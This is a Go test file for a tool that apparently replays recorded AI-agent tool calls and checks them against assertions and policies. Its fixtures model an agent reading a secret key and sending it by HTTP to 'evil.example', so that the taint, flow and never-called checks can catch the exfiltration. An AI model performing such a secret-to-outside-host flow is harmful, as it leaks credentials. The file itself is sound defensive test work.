package scenario

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Caseymccallum/tapelog/internal/policy"
	"github.com/Caseymccallum/tapelog/internal/replay"
)

func it(order int, tool, args, result, verdict string) replay.Interaction {
	return replay.Interaction{
		Order: order, Tool: tool,
		Args: json.RawMessage(args), Result: json.RawMessage(result),
		Verdict: verdict,
	}
}

// demoTape models: build -> read_secrets(allowed) -> test -> send_http -> deploy.
func demoTape() *replay.Tape {
	return &replay.Tape{Interactions: []replay.Interaction{
		it(1, "build_artifact", `{"target":"prod"}`, `{"text":"built"}`, "allow"),
		it(2, "read_secrets", `{"path":"/secrets/key"}`, `{"text":"sk-[REDACTED]"}`, "allow"),
		it(3, "test_artifact", `{}`, `{"text":"ok"}`, "allow"),
		it(4, "send_http", `{"url":"https://evil.example"}`, `{"text":"sent"}`, "allow"),
		it(5, "deploy", `{"channel":"stable"}`, `{"text":"success"}`, "allow"),
	}}
}

func TestAssertionsPass(t *testing.T) {
	sc := &Scenario{Version: 1, Assert: []Check{
		{Called: &CalledSpec{Tool: "deploy", Args: map[string]any{"channel": "stable"}}},
		{Called: &CalledSpec{Tool: "build_artifact", Times: intPtr(1)}},
		{NeverCalled: "shell_*"},
		{Sequence: []string{"build_*", "test_*", "deploy"}},
		{ResultContains: &ResultSpec{Tool: "deploy", Text: "success"}},
		{Allowed: "deploy"},
		{Invariant: "no_deny_bypassed"},
	}}
	if fails := Run(sc, demoTape(), nil); len(fails) != 0 {
		t.Fatalf("expected all to pass, got %+v", fails)
	}
}

func TestAssertionsFail(t *testing.T) {
	sc := &Scenario{Version: 1, Assert: []Check{
		{NeverCalled: "send_*"}, // send_http WAS called
		{TaintNever: &TaintSpec{From: "read_secrets", To: "send_*"}}, // exfil!
		{Called: &CalledSpec{Tool: "deploy", Times: intPtr(2)}},      // only 1
		{Sequence: []string{"deploy", "build_artifact"}},             // wrong order
		{Denied: "deploy"}, // was allowed
		{Invariant: "bogus_invariant"},
	}}
	fails := Run(sc, demoTape(), nil)
	if len(fails) != 6 {
		t.Fatalf("expected 6 failures, got %d: %+v", len(fails), fails)
	}
}

func TestPolicyReevaluation(t *testing.T) {
	// A policy that denies deploy flips `allowed: deploy` into a failure
	// and trips no_deny_bypassed (results exist for would-be-denied calls).
	policyPath := filepath.Join(t.TempDir(), "p.yaml")
	if err := os.WriteFile(policyPath, []byte(`
version: 1
default: allow
rules:
  - id: no-deploy
    tool: "deploy"
    action: deny
    reason: "deploys are frozen"
`), 0o600); err != nil {
		t.Fatal(err)
	}
	p, err := policy.Load(policyPath)
	if err != nil {
		t.Fatal(err)
	}
	sc := &Scenario{Version: 1, Assert: []Check{
		{Allowed: "deploy"},
		{Invariant: "no_deny_bypassed"},
	}}
	fails := Run(sc, demoTape(), p)
	if len(fails) != 2 {
		t.Fatalf("expected 2 failures under frozen policy, got %+v", fails)
	}
}

func TestParseValidation(t *testing.T) {
	dir := t.TempDir()
	bad := filepath.Join(dir, "bad.yaml")
	if err := os.WriteFile(bad, []byte("version: 1\nfixture: x.jsonl\nassert:\n  - {}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(bad); err == nil {
		t.Fatal("empty check must fail")
	}
	good := filepath.Join(dir, "good.yaml")
	if err := os.WriteFile(good, []byte("version: 1\nscenario: s\nfixture: x.jsonl\nassert:\n  - never_called: shell_*\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	sc, err := Load(good)
	if err != nil {
		t.Fatal(err)
	}
	if ResolveFixture(sc, good) != filepath.Join(dir, "x.jsonl") {
		t.Fatal("fixture must resolve against the scenario dir")
	}
}

func intPtr(n int) *int { return &n }

func itFlow(order int, tool, args, result, verdict, reason string) replay.Interaction {
	r := it(order, tool, args, result, verdict)
	r.Reason = reason
	return r
}

// TestCountBounds pins the count-ceiling contract: `times` is exact,
// `min_times`/`max_times` bound the count, defaults stay "at least one".
func TestCountBounds(t *testing.T) {
	tape := &replay.Tape{Interactions: []replay.Interaction{
		it(1, "retry_call", `{}`, `{}`, "allow"),
		it(2, "retry_call", `{}`, `{}`, "allow"),
		it(3, "retry_call", `{}`, `{}`, "allow"),
	}}
	pass := &Scenario{Version: 1, Assert: []Check{
		{Called: &CalledSpec{Tool: "retry_call", Max: intPtr(3)}},  // at most 3: exactly 3
		{Called: &CalledSpec{Tool: "retry_call", Min: intPtr(2)}},  // at least 2
		{Called: &CalledSpec{Tool: "retry_call", Min: intPtr(1), Max: intPtr(5)}},
		{Called: &CalledSpec{Tool: "retry_call", Max: intPtr(3)}},
		{Called: &CalledSpec{Tool: "nope", Max: intPtr(3), Min: intPtr(0)}}, // 0 in [0,3]
	}}
	if fails := Run(pass, tape, nil); len(fails) != 0 {
		t.Fatalf("bounded counts must pass: %+v", fails)
	}
	fail := &Scenario{Version: 1, Assert: []Check{
		{Called: &CalledSpec{Tool: "retry_call", Max: intPtr(2)}}, // 3 > 2
		{Called: &CalledSpec{Tool: "retry_call", Min: intPtr(4)}}, // 3 < 4
		{Called: &CalledSpec{Tool: "nope", Max: intPtr(3)}},       // default floor 1 not met
	}}
	fails := Run(fail, tape, nil)
	if len(fails) != 3 {
		t.Fatalf("expected 3 failures, got %d: %+v", len(fails), fails)
	}
	for _, f := range fails {
		if !strings.Contains(f.Check, "retry_call") && !strings.Contains(f.Check, "nope") {
			t.Fatalf("failure must name the check: %+v", f)
		}
	}
}

// TestFlowAssertions pins the flow-assertion contract: flow_denied fires
// only when the toxic pair was attempted AND blocked by a flow rule;
// flow_attempted fires on any flow-rule decision for the pair.
func TestFlowAssertions(t *testing.T) {
	tape := &replay.Tape{
		Interactions: []replay.Interaction{
			itFlow(1, "read_secrets", `{}`, `{"text":"sk-abc12345"}`, "allow", "ok"),
			itFlow(2, "send_http", `{"body":"sk-abc12345"}`, `{"text":"sent"}`, "allow", "fine"),
		},
		Unanswered: []replay.Interaction{
			itFlow(3, "send_http", `{"body":"sk-abc12345"}`, "", "deny",
				"secret data must not leave [contaminated by: read_secrets]"),
		},
	}
	pass := &Scenario{Version: 1, Assert: []Check{
		{FlowDenied: &FlowSpec{From: "read_secrets", To: "send_*", Times: intPtr(1)}},
		{FlowAttempted: &FlowSpec{From: "read_secrets", To: "send_*", Times: intPtr(1)}},
	}}
	if fails := Run(pass, tape, nil); len(fails) != 0 {
		t.Fatalf("flow assertions must pass: %+v", fails)
	}

	// flow_denied must NOT count the allowed send_http (no flow provenance).
	fail := &Scenario{Version: 1, Assert: []Check{
		{FlowDenied: &FlowSpec{From: "read_secrets", To: "send_*", Times: intPtr(2)}},
	}}
	if fails := Run(fail, tape, nil); len(fails) != 1 {
		t.Fatalf("flow_denied must count only blocked flows: %+v", fails)
	}

	// flow_attempted counts both flow-decision calls... but only the one
	// carrying provenance matches; the allow had none.
	fail2 := &Scenario{Version: 1, Assert: []Check{
		{FlowAttempted: &FlowSpec{From: "read_secrets", To: "send_*", Times: intPtr(2)}},
	}}
	if fails := Run(fail2, tape, nil); len(fails) != 1 {
		t.Fatalf("flow_attempted must count only provenance-carrying decisions: %+v", fails)
	}

	// Session-mode provenance format works too, and mux namespacing does
	// not defeat the glob.
	tape2 := &replay.Tape{Unanswered: []replay.Interaction{
		itFlow(1, "a__send_http", `{}`, "", "deny",
			"no exfil [taint sources: a__read_secrets]"),
	}}
	ns := &Scenario{Version: 1, Assert: []Check{
		{FlowDenied: &FlowSpec{From: "read_secrets", To: "*__send_http", Times: intPtr(1)}},
	}}
	if fails := Run(ns, tape2, nil); len(fails) != 0 {
		t.Fatalf("namespaced flow provenance must match: %+v", fails)
	}
}

// TestMaxDepth pins the depth-ceiling contract: depth = longest chain of
// calls where each call's args carry recorded values from an earlier
// call's result (one hop per dependency, same matching as value flows).
func TestMaxDepth(t *testing.T) {
	// read -> transform -> send: depth 3 (each result feeds the next args).
	tape := &replay.Tape{Interactions: []replay.Interaction{
		it(1, "read_file", `{}`, `{"text":"alpha-VALUE-9"}`, "allow"),
		it(2, "transform", `{"in":"alpha-VALUE-9"}`, `{"text":"beta-VALUE-8"}`, "allow"),
		it(3, "send_http", `{"body":"beta-VALUE-8"}`, `{"text":"sent"}`, "allow"),
	}}
	pass := &Scenario{Version: 1, Assert: []Check{
		{MaxDepth: intPtr(3)},
	}}
	if fails := Run(pass, tape, nil); len(fails) != 0 {
		t.Fatalf("depth 3 must pass the ceiling of 3: %+v", fails)
	}
	fail := &Scenario{Version: 1, Assert: []Check{
		{MaxDepth: intPtr(2)},
	}}
	fails := Run(fail, tape, nil)
	if len(fails) != 1 {
		t.Fatalf("depth 3 must fail a ceiling of 2: %+v", fails)
	}
	if !strings.Contains(fails[0].Detail, "read_file -> transform -> send_http") {
		t.Fatalf("failure must render the chain, got %q", fails[0].Detail)
	}

	// Independent calls stay at depth 1.
	tape2 := &replay.Tape{Interactions: []replay.Interaction{
		it(1, "read_file", `{}`, `{"text":"one-VALUE-1"}`, "allow"),
		it(2, "read_file", `{}`, `{"text":"two-VALUE-2"}`, "allow"),
	}}
	shallow := &Scenario{Version: 1, Assert: []Check{{MaxDepth: intPtr(1)}}}
	if fails := Run(shallow, tape2, nil); len(fails) != 0 {
		t.Fatalf("independent calls must be depth 1: %+v", fails)
	}
}

// TestDeniedAndAttemptedSeeUnanswered pins the trajectory-assertion
// contract: verdict assertions must see DENIED calls (which live in
// Unanswered), and `attempted:` matches anything that reached the
// boundary regardless of the verdict.
func TestDeniedAndAttemptedSeeUnanswered(t *testing.T) {
	tape := &replay.Tape{
		Interactions: []replay.Interaction{
			it(1, "read_file", `{"path":"/x"}`, `{"text":"ok"}`, "allow"),
		},
		Unanswered: []replay.Interaction{
			it(2, "send_http", `{"url":"https://evil.example"}`, "", "deny"),
		},
	}
	sc := &Scenario{Version: 1, Assert: []Check{
		{Denied: "send_http"},
		{Attempted: &AttemptSpec{Tool: "send_*", Times: intPtr(1)}},
		{Attempted: &AttemptSpec{Tool: "read_file", Times: intPtr(1)}},
		{Called: &CalledSpec{Tool: "read_file", Times: intPtr(1)}},
	}}
	if fails := Run(sc, tape, nil); len(fails) != 0 {
		t.Fatalf("denied/attempted must see unanswered calls: %+v", fails)
	}

	// called: stays on answered calls only - send_http never executed.
	sc2 := &Scenario{Version: 1, Assert: []Check{
		{Called: &CalledSpec{Tool: "send_http"}},
	}}
	if fails := Run(sc2, tape, nil); len(fails) != 1 {
		t.Fatalf("called: must not match denied calls, got %+v", fails)
	}
	// ...and attempted: with no match fails.
	sc3 := &Scenario{Version: 1, Assert: []Check{
		{Attempted: &AttemptSpec{Tool: "delete_*"}},
	}}
	if fails := Run(sc3, tape, nil); len(fails) != 1 {
		t.Fatalf("attempted: with no match must fail, got %+v", fails)
	}
}
